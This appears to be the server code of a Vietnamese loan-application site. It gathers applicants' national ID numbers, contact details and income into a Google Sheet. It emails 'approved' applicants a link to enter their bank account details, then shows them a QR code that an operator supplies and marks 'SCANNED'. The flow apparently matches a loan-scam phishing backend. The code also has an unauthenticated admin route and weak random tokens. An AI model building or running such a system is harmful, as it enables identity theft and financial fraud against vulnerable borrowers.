require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { GoogleSpreadsheet } = require('google-spreadsheet');
const { JWT } = require('google-auth-library');

const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 5000;

// Email Transporter (Instructions will be provided to user)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// In-memory mock database for fallback
let mockDB = {};

// Google Sheets Config
const SCOPES = [
    'https://www.googleapis.com/auth/spreadsheets',
    'https://www.googleapis.com/auth/drive.file',
];

// Google Sheets Helpers
let cachedDoc = null;
async function getSheets() {
    try {
        if (!process.env.GOOGLE_SHEET_ID) {
            throw new Error('GOOGLE_SHEET_ID is missing in .env file');
        }

        if (!cachedDoc) {
            const creds = require('./google-key.json');
            const auth = new JWT({
                email: creds.client_email,
                key: creds.private_key,
                scopes: SCOPES,
            });
            const doc = new GoogleSpreadsheet(process.env.GOOGLE_SHEET_ID, auth);
            await doc.loadInfo();
            cachedDoc = doc; // Only cache after loadInfo is successful
        }

        const doc = cachedDoc;

        // 1. Info Sheet
        let infoSheet = doc.sheetsByTitle['DangKyVayVon'];
        if (!infoSheet) {
            infoSheet = doc.sheetsByIndex[0];
            await infoSheet.updateProperties({ title: 'DangKyVayVon' });
        }

        // ALWAYS set headers to ensure we have the 'email_sent' and 'token' columns ready
        await infoSheet.setHeaderRow([
            'thoi_gian', 'ho_ten', 'tuoi', 'cccd', 'sdt', 'email',
            'dia_chi', 'nghe_nghiep', 'da_vay', 'thu_nhap', 'so_tien', 'status', 'token', 'email_sent'
        ]);

        // 2. Bank Sheet
        let bankSheet = doc.sheetsByTitle['ThongTinNganHang'];
        if (!bankSheet) {
            bankSheet = await doc.addSheet({ title: 'ThongTinNganHang' });
        }

        await bankSheet.setHeaderRow([
            'thoi_gian', 'token', 'qr_url', 'chu_tk', 'ngan_hang', 'stk', 'status'
        ]);

        return { infoSheet, bankSheet };
    } catch (err) {
        console.error('[SHEET FATAL ERROR]:', err.message);
        cachedDoc = null; // Invalidate cache on error
        return null;
    }
}

// Background Task: Check for un-sent approval emails
async function checkAndSendEmails() {
    console.log('[MAILER] Polling for approvals (Waiting 60s between checks)...');
    try {
        const sheets = await getSheets();
        if (!sheets) return;

        const rows = await sheets.infoSheet.getRows();
        for (const row of rows) {
            const status = (row.get('status') || '').toUpperCase();
            const emailSent = row.get('email_sent');
            const userEmail = row.get('email');
            const token = row.get('token');
            const fullName = row.get('ho_ten');

            if (status === 'APPROVED' && emailSent !== 'YES' && userEmail) {
                // Generate token ONLY at approval time if not already present
                let activeToken = token;
                if (!activeToken) {
                    activeToken = 'loan-' + Math.random().toString(36).substr(2, 9);
                    row.set('token', activeToken);
                    console.log(`[MAILER] Generated new token for ${fullName}: ${activeToken}`);
                }

                console.log(`[MAILER] Triggering email for ${fullName} (${userEmail})`);

                const appUrl = process.env.FRONTEND_URL || 'http://localhost:5173';
                const verifyLink = `${appUrl}/?token=${activeToken}`;

                const mailOptions = {
                    from: `"Hỗ trợ vay vốn" <${process.env.EMAIL_USER}>`,
                    to: userEmail,
                    subject: 'Hồ sơ vay vốn của bạn đã được phê duyệt',
                    html: `
                        <div style="font-family: Arial, sans-serif; line-height: 1.6;">
                            <h2>Chào ${fullName},</h2>
                            <p>Chúc mừng! Hồ sơ đăng ký vay vốn của bạn đã được chúng tôi phê duyệt thành công.</p>
                            <p>Vui lòng nhấn vào nút bên dưới để cập nhật thông tin giải ngân và nhận tiền:</p>
                            <div style="text-align: center; margin: 30px 0;">
                                <a href="${verifyLink}" style="background: #1a4f7a; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold;">CẬP NHẬT THÔNG TIN NGÂN HÀNG</a>
                            </div>
                            <p>Hoặc copy link sau: <br> ${verifyLink}</p>
                            <p>Trân trọng,<br>Hệ thống hỗ trợ vay vốn</p>
                        </div>
                    `
                };

                try {
                    if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
                        await transporter.sendMail(mailOptions);
                        row.set('email_sent', 'YES');
                        await row.save();
                        console.log(`[MAILER] Email sent successfully to ${userEmail}`);
                    } else {
                        console.warn('[MAILER] SKIP: Email credentials not configured.');
                    }
                } catch (err) {
                    console.error('[MAILER ERROR]:', err.message);
                }
            }
        }
    } catch (err) {
        if (err.message.includes('429')) {
            console.warn('[MAILER] API Quota hit. Slower polling is active.');
        } else {
            console.error('[MAILER LOOP ERROR]:', err.message);
        }
    }
}

// Check every 5 seconds (Faster response for admin approval)
setInterval(checkAndSendEmails, 5000);

// Routes
app.post('/api/submit', async (req, res) => {
    const data = req.body;
    const timestamp = new Date().toLocaleString('vi-VN');

    console.log('[API] Processing submission for:', data.fullname);

    try {
        // Mock fallback (no token yet)
        mockDB['temp-' + Math.random().toString(36).substr(2, 9)] = { ...data, status: 'pending', timestamp };

        const sheets = await getSheets();
        if (sheets) {
            console.log('[SHEET] Adding row to infoSheet...');
            await sheets.infoSheet.addRow({
                'thoi_gian': timestamp,
                'ho_ten': data.fullname,
                'tuoi': data.age,
                'cccd': data.cccd,
                'sdt': data.phone,
                'email': data.email,
                'dia_chi': data.address,
                'nghe_nghiep': data.occupation,
                'da_vay': data.hasLoan || 'no',
                'thu_nhap': data.income,
                'so_tien': data.loanAmount,
                'status': 'PENDING',
                'token': '', // DO NOT generate token yet
                'email_sent': 'NO'
            });
            console.log('[SHEET] Success: Data saved. No token generated yet.');
        } else {
            console.warn('[SHEET] Warning: Connection failed, data only saved in memory (Mock Mode).');
        }

        res.json({ result: 'success' });
    } catch (err) {
        console.error('[API ERROR] Submit:', err.message);
        res.status(500).json({ result: 'error', message: err.message });
    }
});

// Status Cache to avoid hitting Google Quota (60/min)
let statusCache = {
    data: null,
    lastFetch: 0
};

app.get('/api/status', async (req, res) => {
    const { token } = req.query;
    let result = { status: 'pending', qr_url: '' };

    try {
        const now = Date.now();
        // Only fetch from Google if cache is older than 5 seconds
        if (!statusCache.data || (now - statusCache.lastFetch > 5000)) {
            const sheets = await getSheets();
            if (sheets) {
                const infoRows = await sheets.infoSheet.getRows();
                const bankRows = await sheets.bankSheet.getRows();
                statusCache.data = { infoRows, bankRows };
                statusCache.lastFetch = now;
            }
        }

        if (statusCache.data) {
            const infoRow = statusCache.data.infoRows.find(r => r.get('token') === token);
            const bankRow = statusCache.data.bankRows.find(r => r.get('token') === token);

            // Determine status based on sheet data
            if (infoRow) {
                const infoStatus = (infoRow.get('status') || 'PENDING').toUpperCase();

                if (infoStatus === 'PENDING') {
                    result.status = 'pending';
                } else if (infoStatus === 'APPROVED') {
                    // Check if bank row exists
                    if (bankRow) {
                        const qrUrl = bankRow.get('qr_url') || '';
                        const bankStatus = (bankRow.get('status') || '').toUpperCase();

                        if (bankStatus === 'DONE' || bankStatus === 'SCANNED') {
                            // Admin confirmed → success
                            result.status = 'done';
                        } else if (qrUrl) {
                            // Admin added QR URL → show QR to user
                            result.status = 'qr_ready';
                            result.qr_url = qrUrl;
                        } else {
                            // Bank info submitted but waiting for admin to add QR
                            result.status = 'waiting_qr';
                        }
                    } else {
                        result.status = 'approved';
                    }
                }
            }
        }
    } catch (err) {
        console.warn('[STATUS API] Error:', err.message);
    }

    res.json(result);
});

app.post('/api/submit-bank', async (req, res) => {
    const { token, bankOwner, bankName, bankAccount } = req.body;
    const timestamp = new Date().toLocaleString('vi-VN');

    console.log('[API] Bank details for token:', token);

    try {
        const sheets = await getSheets();
        if (sheets) {
            await sheets.bankSheet.addRow({
                'thoi_gian': timestamp,
                'token': token,
                'chu_tk': bankOwner,
                'ngan_hang': bankName,
                'stk': bankAccount,
                'qr_url': '', // Admin will fill this later
                'status': 'PENDING' // Admin will set SCANNED later
            });
            console.log('[SHEET] Bank info saved with status PENDING');
        }

        res.json({ result: 'success' });
    } catch (err) {
        console.error('[API ERROR] Bank:', err.message);
        res.status(500).json({ result: 'error', message: err.message });
    }
});

// Admin Route (To manually change status for testing)
app.post('/api/admin/update-status', (req, res) => {
    const { token, status, qr_url } = req.body;
    if (mockDB[token]) {
        mockDB[token].status = status;
        if (qr_url) mockDB[token].qr_url = qr_url;
        res.json({ result: 'success', current: mockDB[token] });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
